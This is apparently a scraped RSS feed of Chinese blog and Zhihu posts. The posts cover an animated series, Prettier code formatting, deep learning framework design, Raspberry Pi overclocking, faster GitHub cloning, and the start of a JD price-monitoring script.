data-watermark=\"watermark\" data-original-src=\"v2-eabce0cf9f590bb49386feed50d039fe\" data-watermark-src=\"v2-8c026c0927c1bea3427e65b47e68f47f\" data-private-watermark-src=\"v2-ecdc1960a78135abbe280ab0e2c0d7d4\"></p>\n<p>     除了父子情感线外，羊羊们和机器人反派之间也铺满了细节伏笔，细心的观众能从中发现不少彩蛋和线索，可能是一个镜头，一句不起眼的台词，都有精心设计，大家可以一起在剧中去挖掘和发现。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-bee409e1867b5f15623526aeace1e957_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1191\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-bee409e1867b5f15623526aeace1e957\" data-watermark-src=\"v2-05de8057b4ae1a5fef465a5b0539e970\" data-private-watermark-src=\"v2-2a5fcecd244bb70b6534d078306c2540\"></p>\n<h3><b>突破创新，不忘初心：经典角色相继露面上演“回忆杀”！</b></h3>\n<p>   《决战次时代》是一次全新的创作突破，也是经典的回归，我们向前出发，但坚持初心。那些陪伴了大家十五年的经典角色也会在剧里相继露面，比如15年前那只爱吃香蕉的蕉太狼，抢戏的草原三恶霸，路人王小飞机等等，还有大电影里深受大家喜爱的动人歌曲《星光下的梦想》和《知己》也会在本剧里有“重头戏”，相信这些熟悉的身影和声音都会勾起观众们对喜灰十五年经典时刻的回忆。大家可以在观看的过程中多注意，找找我们藏下的小彩蛋。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-6df1b905de26dd199037eccccaeb3f36_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1191\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-6df1b905de26dd199037eccccaeb3f36\" data-watermark-src=\"v2-6f3d77f463c7a23c8a40a250172bd169\" data-private-watermark-src=\"v2-d60473f79d1c264e2b12db639ee12c82\"></p>\n<h3><b>打破次元壁，借动漫之力传播城市文化</b></h3>\n<p>     创作来源于生活，这次《决战次时代》的主场景来到了繁华的现代化科技城市，团队在场景设计上也下足了功夫。作为土生土长在“羊城”广州的动漫IP，很多设计师在广州生活多年,设计师们将他们的生活“日常场景”还原到作品设计中，让动画场景看上去更接地气，有生活感和真实感。同时，通过动画片传播城市文明和文化魅力。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-3d3ab494ad48a14dc548eba357e2a7c6_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1191\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-3d3ab494ad48a14dc548eba357e2a7c6\" data-watermark-src=\"v2-19916679a22a20f713928f5201efedc0\" data-private-watermark-src=\"v2-6fd67d18446164f1e35bd67a277b13ff\"></p>\n<h3>\n<b>羊羊的长大代表完结？喜灰小时候的故事还会继续吗？</b> </h3>\n<p>     次时代只是羊狼故事里的其中一段旅程，是对未来的展望，是新的开始，而不是结束。无论过去十五年还是以后的更多个十五年，变的是不断前进的脚步，不变的是原创动力团队对大家的感谢和坚持原创的初心！我们的大电影也就在前方，向大家飞奔而来，相信不久之后活力新鲜的羊狼就会在大荧幕跟和大家见面啦！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-0b24debf01ab8cd6a5f889b802fa2eaa_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"1191\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-0b24debf01ab8cd6a5f889b802fa2eaa\" data-watermark-src=\"v2-34fb175de9cc90e3803919d702082639\" data-private-watermark-src=\"v2-c10480141fefa9582a82b43adb2f2a05\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/huang-wei-ming-leohuang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">黄伟明</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/470292481/answer/1999413742?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">50 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/446647681?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">你们觉得现在《喜羊羊与灰太狼》有可能崛起吗 ？</a><br><a href=\"http://www.zhihu.com/question/265931334?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">《喜羊羊与灰太狼》里有什么细思极恐的细节？</a><br>\n","link":"http://www.zhihu.com/question/470292481/answer/1999413742?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"关于深度学习框架的一些自己见解","date":"2021-07-13 13:15:08","description":"\n<p>上次写博客还是10多年前，然后还险些出现了事故，所以就一直没有写了。一晃就10几年过去了，虽然有时候看着一些知乎大咖（前同事等）在消费我们原来做的一些事情，很想回应几句，但是最后也是不了了之。最近团队一位知乎大咖去创业了，所以为了团队的建设，所以决定开始写写自己对于系统领域的一些感悟，也希望通过这个能够让大家更加理解我们团队，以及分享我本人对于系统的一些理解。纯属自己的观点，大家有不同观点，欢迎指正和讨论。</p>\n<p>我一直工作在分布式系统的领域，从大数据到AI工程，其实有不少做系统的我们这行的人，很多都有这个路径，所以第一篇就先聊聊自己一个感悟，说说最近做的深度学习框架，算是开一个头。</p>\n<p>我觉得做深度学习框架其实有两个派别的人，一派是从分布式系统的人来做的，另外一派是从做算法的人来做的。不同的人的背景不同，所以做这个事情的角度也会不同，从而产生不同门派。tensorflow属于系统派，而pytorch属于算法派。像我们这种做系统，特别是做过超大规模分布式系统的人，往往最担心的就是要对一个已经部署在成千上万台的计算集群上的平台软件需要做重大重构，这个中间困难没有做过这个事情的人可能不会太有体感，这么大一个平台，公司不可能财力让你能够去镜像一个集群去做任务的迁移，并且越大公司的平台上用户数众多，业务都会耦合在一起去完成公司的使命，基本上你不可能有时间点可以让全公司的业务团队放下他们自己手头的优先级来配合你做这种迁移，哪怕你工程能力非常强，这种迁移中间不会出现任何意外。何况很复杂系统要做到这一点基本上是很难的。所以我们做系统的，往往会把系统设计得更加具有可扩展性，从而尽最大可能去避免这种大的重构和推倒重来。当我们在面对需要构建一个深度学习框架的时候，我们第一时间就在设想这个框架需要能够从规模上很好支持分布式，能够很好的扩展到任意大的深度模型的框架，我们希望构建一个系统，能够像人脑一样能够把视觉，语音，语言等多种模型能够一同训练。其实这个就是tensorflow这样系统构造的时候的原始想法，把整个计算构成一个Tensor的Flow图。因为分布式本身就很复杂，需要处理各种节点相互的数据和执行中的各种依赖关系。这些事情由人来写代码，太繁琐且容易出错，所以自然地，我们就会设想由系统来负责这种依赖关系。这也就是为什么我们希望整个分布式执行的计划是一个静态图，然后系统再根据用户指定的或者系统智能的决定的placement进行分图，并在这些分图中添加合适的Send-Recv的Op从而构成一个分布式的执行计划。但是这样的设计理念也会带来一些困恼，我们在模型训练时候有时候有些类似控制图的部分，在这种设计理念下，我们必须要把这些控制流图的代码也op化，然后把这些op也整体串联在Tensor的Flow执行图中，大家有兴趣了解细节的话也可以看看我的老朋友也是前同事Yuan Yu写的文章：<a href=\"https://link.zhihu.com/?target=https%3A//arxiv.org/abs/1805.01772\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Dynamic Control Flow in Large-Scale Machine Learning, Eurosys2018.</a>  但是这种方式会使得一些习惯单机开发的研究人员觉得比较晦涩。同时也是因为分布式的原因，我们做系统的很自然会把模型的开发过程分成构图和执行两个阶段。构图的时候只是生成一个逻辑执行计划，然后通过显式方式的提交（或者execute）过程进行执行。这种方式让研究人员觉得不能一边写代码一边就能够马上看到代码片段的结果，所以这也造成很多人诟病TensorFlow的模式不太容易debug自己的模型程序，其实这也是因为分布式带来负担。但是也是因为TensorFlow是静态图的方式，其可以做到训推一体，在训练出来的模型能够导出模型图，并且在这个图上进行系统化的推理优化从而能够非常方便部署到线上。这个系统性化的方法带来另外一个优势。</p>\n<p>框架的另外一派是算法派，特别是感知类模型（图像，语音，语言类）训练，因为这类训练一般都是同步训练，然后“分布式训练”也不像前者那样设想是任意异构的分布式执行图（即每个分布式节点的执行逻辑可以不同），因为是数据并行，这样我们就可以利用MPI的AllReduce的通讯源语来进行梯度的汇集计算。算法同学需要是一种丰富的可扩展的在GPU上能够很好运行的，并且能够很好进行自动梯度的算子库，并且因为面向是数据并行的场景，这样话在神经网络部分其实都是单机程序，从而可以利用任何python的语法糖去构建任何的动态的训练控制逻辑（大家也把这种称作动态图），对于算法研究人员来讲，这种方式写代码比较随性也方便debug，所以在研究界pytorch得到大量的关注和使用。</p>\n<p>刚才说过TensorFlow从设计之初就在考虑可以超大的模型分布式训练的场景，但是没有预想到硬件的发展也非常迅速，显存越来越大以及训练技术的发展，还有非常精细化优化显存的工作，比如DeepSpeed等把optimizer所需要的显存sharding化掉，使得除了超大规模稀疏模型训练外，感知类的SOTA模型一直可以利用数据并行的方式来进行训练。从而使得TensorFlow这种设计理念看上去有overdesign的嫌疑。并且就算超大规模稀疏模型训练，因为TensorFlow整体化的设计理念，不把Parameter Server作为游离在Flow图之外，使得他在超大规模场景下的scalability上出现了问题，从而催生一堆自建PS+深度学习框架的（稀疏）模型训练框架。这是另外一个话题，我会在日后写一写在这个领域上我们一些工作。</p>\n<p>好在随着transformer的出现，我们终于有方法能够回归到最初那个梦想，使得我们可以把多种数据（视觉的，文字的）合在一起训练多模态的模型，因为问题规模的增大，必然需要更多参数的模型来支持，所以我们迅速将模型大小从几十亿增加到万亿规模，这个时候就必然需要能够支持很好模型并行框架，这也是为什么最近这个领域重新变得火热，比如类似OneFlow，MindSpore，PaddlePaddle，Mesh Tensorflow，GShard，以及我们阿里的Whale框架。</p>\n<p>其实从设计理念来看，模型并行正是回归到原来TensorFlow一开始设计时候的设想，只是那个时候因为模型并行的需求不够，没有必要提供比较好高层自动分布式的抽象，写模型的人还是可以自己精细化去构造每个计算节点的子图，整体上TensorFlow的框架只是负责把这些子图能够自动通过Send-Recv进行连接，并且在Runtime能够合法的进行计算。而现在，因为需求增多，算法迭代需求的增多，迫切需要一种高层次的自动分布式框架，从而使得算法同学能够去快速简单构造一个逻辑图的方式去构造自己神经网络，而由系统层来帮助他来进行复杂模型并行的构成。所以其实可以看到TensorFlow的设计理念正好就是为这个考虑的，利用静态图，我们可以逻辑性去描述一个网络训练，然后在执行时候在进行系统化的分图和分布式训练。所以说自动分布式的需求并没有超越原来设计的基本范畴，也是因为这样，我们采取和谷歌Gshard类似技术路线去提供自动分布式的能力。正是站在原有框架基础上去做增量。</p>\n<p>不同于GShard更加关注于谷歌TPU集群，我们关注于异构的GPU集群，这里所说异构是因为我们不如谷歌这么有钱，构建非常大的同构化TPU集群，我们集群中有不同年代的GPU和CPU，这些GPU各自算力和显存都大小不一。也正是因为这样，其实给我们系统提出更大挑战，我们在进行自动分布式时候需要在cost model上考虑好这些差异点。这样才能做到比较优化的分布式训练。这也是我们自动分布式框架Whale一种差异性和核心能力之一。</p>\n<p>其实系统派的框架和算法派的框架也在进行一定的融合，TensorFlow提出了Eager模式，通过TF.function在eager模式下可能单步执行计算，得到Tensor来提高可调式性；而Pytorch通过Trace或者Parse的方式转化为TorchScript的图描述，从而能够更好支持训练到推理的工程化。但是这种动静结合其实只是在一定层次的，比如如果考虑分布式，Trace的方式去得到TorchScript就不足够。需要进一步去限制构图能够使用的API，这也是像NV的megatron以及微软DeepSpeed在Pytorch上去支持分布式所带来的一些约束，感兴趣的可以读读OneFlow的Blog：《<a href=\"https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/IN281OPUEOI12ge3hOvvTw\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">GPT-3难以复现，为什么说PyTorch走上了一条“大弯路”？”》</a></p>\n<p>总结下我的观点：我觉得现在深度学习框架主要流行的两个TensorFlow和Pytorch是有其设计理念的原因的。我们做Whale正是在这种理解的基础上进行路线选择，并且认为应该站在已有的工作基础上去做增量的东西。而不是再去造一个别人做过的轮子。接下来我还陆续展开我们分布式框架Whale，大规模稀疏模型训练工作，编译系统Ansor和DISC，以及我们如何把分布式，编译和调度有机结合方面一系列系统工作，敬请关注。如果大家对于我们PAI团队的工作有兴趣，非常欢迎和我们联系，我的邮箱是weilin.lw@alibaba-inc.com</p>\n<p>PS：写Blog写的不多，还需要多训练，感觉有点虎头蛇尾的，呵呵。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/backom?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">backom</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/375634204?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 